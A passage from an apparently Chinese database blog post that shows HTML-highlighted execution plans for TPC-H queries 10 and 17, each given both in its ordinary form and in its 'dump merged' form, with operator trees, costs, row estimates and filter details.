class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)))], [VIEW1.customer.c_acctbal], [VIEW4.nation.n_name], [VIEW1.customer.c_address], [VIEW1.customer.c_phone], [VIEW1.customer.c_comment]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([VIEW1.customer.c_custkey], [VIEW1.customer.c_name], [VIEW1.customer.c_acctbal], [VIEW1.customer.c_phone], [VIEW4.nation.n_name], [VIEW1.customer.c_address], [VIEW1.customer.c_comment]), agg_func([T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)))])</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([VIEW1.customer.c_custkey], [VIEW1.customer.c_name], [VIEW1.customer.c_acctbal], [VIEW4.nation.n_name], [VIEW1.customer.c_address], [VIEW1.customer.c_phone], [VIEW1.customer.c_comment], [<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW3.lineitem.l_orderkey <span class="operator">=</span> VIEW2.orders.o_orderkey]), other_conds(nil)</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([VIEW3.lineitem.l_orderkey], [VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW3.lineitem.l_orderkey], [VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([lineitem.l_orderkey], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([lineitem.l_orderkey]), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount]), <span class="keyword">filter</span>([lineitem.l_returnflag <span class="operator">=</span> <span class="string">&#x27;R&#x27;</span>]),</span><br><span class="line">      access([lineitem.l_orderkey], [lineitem.l_returnflag], [lineitem.l_extendedprice], [lineitem.l_discount]), partitions(p0)</span><br><span class="line">  <span class="number">7</span> <span class="operator">-</span> output([VIEW1.customer.c_custkey], [VIEW1.customer.c_name], [VIEW1.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW1.customer.c_acctbal], [VIEW4.nation.n_name], [VIEW1.customer.c_address], [VIEW1.customer.c_phone], [VIEW1.customer.c_comment], [VIEW2.orders.o_orderkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW1.customer.c_custkey <span class="operator">=</span> VIEW2.orders.o_custkey]), other_conds(nil)</span><br><span class="line">  <span class="number">8</span> <span class="operator">-</span> output([VIEW2.orders.o_custkey], [VIEW2.orders.o_orderkey], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW2.orders.o_custkey], [VIEW2.orders.o_orderkey], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">9</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([orders.o_custkey], [orders.o_orderkey]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">10</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey]), <span class="keyword">filter</span>([<span class="built_in">cast</span>(orders.o_orderDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&gt;=</span> ?], [<span class="built_in">cast</span>(orders.o_orderDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE]), partitions(p0)</span><br><span class="line">  <span class="number">11</span> <span class="operator">-</span> output([VIEW1.customer.c_custkey], [VIEW1.customer.c_name], [VIEW1.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW1.customer.c_acctbal], [VIEW4.nation.n_name], [VIEW1.customer.c_address], [VIEW1.customer.c_phone], [VIEW1.customer.c_comment]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW1.customer.c_nationkey <span class="operator">=</span> VIEW4.nation.n_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">12</span> <span class="operator">-</span> output([VIEW4.nation.n_nationkey], [VIEW4.nation.n_name], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW4.nation.n_nationkey], [VIEW4.nation.n_name], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">13</span> <span class="operator">-</span> output([nation.n_nationkey], [nation.n_name], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([nation.n_nationkey], [nation.n_name]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">14</span> <span class="operator">-</span> output([nation.n_nationkey], [nation.n_name]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([nation.n_nationkey], [nation.n_name]), partitions(p0)</span><br><span class="line">  <span class="number">15</span> <span class="operator">-</span> output([VIEW1.customer.c_custkey], [VIEW1.customer.c_nationkey], [VIEW1.customer.c_name], [VIEW1.customer.c_acctbal], [VIEW1.customer.c_phone], [VIEW1.customer.c_address], [VIEW1.customer.c_comment], [VIEW1.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW1.customer.c_custkey], [VIEW1.customer.c_nationkey], [VIEW1.customer.c_name], [VIEW1.customer.c_acctbal], [VIEW1.customer.c_phone], [VIEW1.customer.c_address], [VIEW1.customer.c_comment], [VIEW1.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">16</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_nationkey], [customer.c_name], [customer.c_acctbal], [customer.c_phone], [customer.c_address], [customer.c_comment], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([customer.c_custkey], [customer.c_nationkey], [customer.c_name], [customer.c_acctbal], [customer.c_phone], [customer.c_address], [customer.c_comment]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">17</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_nationkey], [customer.c_name], [customer.c_acctbal], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([customer.c_custkey], [customer.c_nationkey], [customer.c_name], [customer.c_acctbal], [customer.c_address], [customer.c_phone], [customer.c_comment]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.026</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>转储合并后的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR        <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>LIMIT           <span class="operator">|</span>        <span class="operator">|</span><span class="number">20</span>       <span class="operator">|</span><span class="number">9753872</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> TOP<span class="operator">-</span>N SORT     <span class="operator">|</span>        <span class="operator">|</span><span class="number">20</span>       <span class="operator">|</span><span class="number">9753869</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">|</span>        <span class="operator">|</span><span class="number">273659</span>   <span class="operator">|</span><span class="number">8556264</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   HASH <span class="keyword">JOIN</span>    <span class="operator">|</span>        <span class="operator">|</span><span class="number">273659</span>   <span class="operator">|</span><span class="number">8160619</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>nation  <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">41</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>    HASH <span class="keyword">JOIN</span>   <span class="operator">|</span>        <span class="operator">|</span><span class="number">273659</span>   <span class="operator">|</span><span class="number">7908405</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>     HASH <span class="keyword">JOIN</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">279244</span>   <span class="operator">|</span><span class="number">7017068</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">7</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN<span class="operator">|</span>orders  <span class="operator">|</span><span class="number">166667</span>   <span class="operator">|</span><span class="number">770751</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">8</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN<span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">2000405</span>  <span class="operator">|</span><span class="number">5172554</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">9</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN <span class="operator">|</span>customer<span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">78809</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [customer.c_acctbal], [nation.n_name], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil), limit(<span class="number">20</span>), <span class="keyword">offset</span>(nil)</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [customer.c_acctbal], [nation.n_name], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil), sort_keys([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount), <span class="keyword">DESC</span>]), topn(<span class="number">20</span>)</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [customer.c_acctbal], [nation.n_name], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([customer.c_custkey], [customer.c_name], [customer.c_acctbal], [customer.c_phone], [nation.n_name], [customer.c_address], [customer.c_comment]), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [customer.c_acctbal], [nation.n_name], [customer.c_address], [customer.c_phone], [customer.c_comment], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([customer.c_nationkey <span class="operator">=</span> nation.n_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([nation.n_nationkey], [nation.n_name]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([nation.n_nationkey], [nation.n_name]), partitions(p0)</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [lineitem.l_extendedprice], [lineitem.l_discount], [customer.c_acctbal], [customer.c_address], [customer.c_phone], [customer.c_comment], [customer.c_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([customer.c_custkey <span class="operator">=</span> orders.o_custkey]), other_conds(nil)</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_extendedprice], [lineitem.l_discount], [orders.o_custkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([lineitem.l_orderkey <span class="operator">=</span> orders.o_orderkey]), other_conds(nil)</span><br><span class="line">  <span class="number">7</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey]), <span class="keyword">filter</span>([<span class="built_in">cast</span>(orders.o_orderDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&gt;=</span> ?], [<span class="built_in">cast</span>(orders.o_orderDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE]), partitions(p0)</span><br><span class="line">  <span class="number">8</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_extendedprice], [lineitem.l_discount]), <span class="keyword">filter</span>([lineitem.l_returnflag <span class="operator">=</span> <span class="string">&#x27;R&#x27;</span>]),</span><br><span class="line">      access([lineitem.l_orderkey], [lineitem.l_returnflag], [lineitem.l_extendedprice], [lineitem.l_discount]), partitions(p0)</span><br><span class="line">  <span class="number">9</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_nationkey], [customer.c_name], [customer.c_acctbal], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([customer.c_custkey], [customer.c_nationkey], [customer.c_name], [customer.c_acctbal], [customer.c_address], [customer.c_phone], [customer.c_comment]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.021</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="SQL-17-执行计划">SQL-17 执行计划</h3>
<ul>
<li>一般情况下的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR         <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST    <span class="operator">|</span></span><br><span class="line"><span class="comment">--------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SCALAR <span class="keyword">GROUP</span> <span class="keyword">BY</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">11610123</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> SUBPLAN SCAN    <span class="operator">|</span>VIEW1   <span class="operator">|</span><span class="number">384317</span>   <span class="operator">|</span><span class="number">11536714</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  <span class="keyword">WINDOW</span> <span class="keyword">FUNCTION</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">1152949</span>  <span class="operator">|</span><span class="number">11281052</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   SORT          <span class="operator">|</span>        <span class="operator">|</span><span class="number">1152949</span>  <span class="operator">|</span><span class="number">11060824</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    HASH <span class="keyword">JOIN</span>    <span class="operator">|</span>        <span class="operator">|</span><span class="number">1152949</span>  <span class="operator">|</span><span class="number">6950110</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>part    <span class="operator">|</span><span class="number">20</span>       <span class="operator">|</span><span class="number">319890</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">6001215</span>  <span class="operator">|</span><span class="number">3976475</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([T_FUN_SUM(VIEW1.lineitem.l_extendedprice) <span class="operator">/</span> <span class="number">7.0</span>]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>(nil), agg_func([T_FUN_SUM(VIEW1.lineitem.l_extendedprice)])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([VIEW1.lineitem.l_extendedprice]), <span class="keyword">filter</span>([VIEW1.lineitem.l_quantity <span class="operator">&lt;</span> VIEW1<span class="number">.0</span><span class="number">.2</span> <span class="operator">*</span> <span class="built_in">avg</span>(l_quantity)]),</span><br><span class="line">      access([VIEW1<span class="number">.0</span><span class="number">.2</span> <span class="operator">*</span> <span class="built_in">avg</span>(l_quantity)], [VIEW1.lineitem.l_quantity], [VIEW1.lineitem.l_extendedprice])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([<span class="number">0.2</span> <span class="operator">*</span> T_FUN_SUM(lineitem.l_quantity) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_quantity), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [lineitem.l_quantity], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      win_expr(T_FUN_SUM(lineitem.l_quantity)), partition_by([part.__pk_increment]), order_by(nil), window_type(<span class="keyword">RANGE</span>), <span class="built_in">upper</span>(UNBOUNDED PRECEDING), <span class="built_in">lower</span>(UNBOUNDED FOLLOWING)</span><br><span class="line">      win_expr(T_FUN_COUNT(lineitem.l_quantity)), partition_by([part.__pk_increment]), order_by(nil), window_type(<span class="keyword">RANGE</span>), <span class="built_in">upper</span>(UNBOUNDED PRECEDING), <span class="built_in">lower</span>(UNBOUNDED FOLLOWING)</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([lineitem.l_quantity], [part.__pk_increment], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil), sort_keys([part.__pk_increment, <span class="keyword">ASC</span>])</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([lineitem.l_quantity], [part.__pk_increment], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([part.p_partkey <span class="operator">=</span> lineitem.l_partkey]), other_conds(nil)</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([part.p_partkey], [part.__pk_increment]), <span class="keyword">filter</span>([part.p_brand <span class="operator">=</span> <span class="string">&#x27;Brand#43&#x27;</span>], [part.p_container <span class="operator">=</span> <span class="string">&#x27;WRAP DRUM&#x27;</span>]),</span><br><span class="line">      access([part.p_partkey], [part.p_brand], [part.p_container], [part.__pk_increment]), partitions(p0)</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_partkey], [lineitem.l_quantity], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([lineitem.l_partkey], [lineitem.l_quantity], [lineitem.l_extendedprice]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.016</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>转储合并后的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span 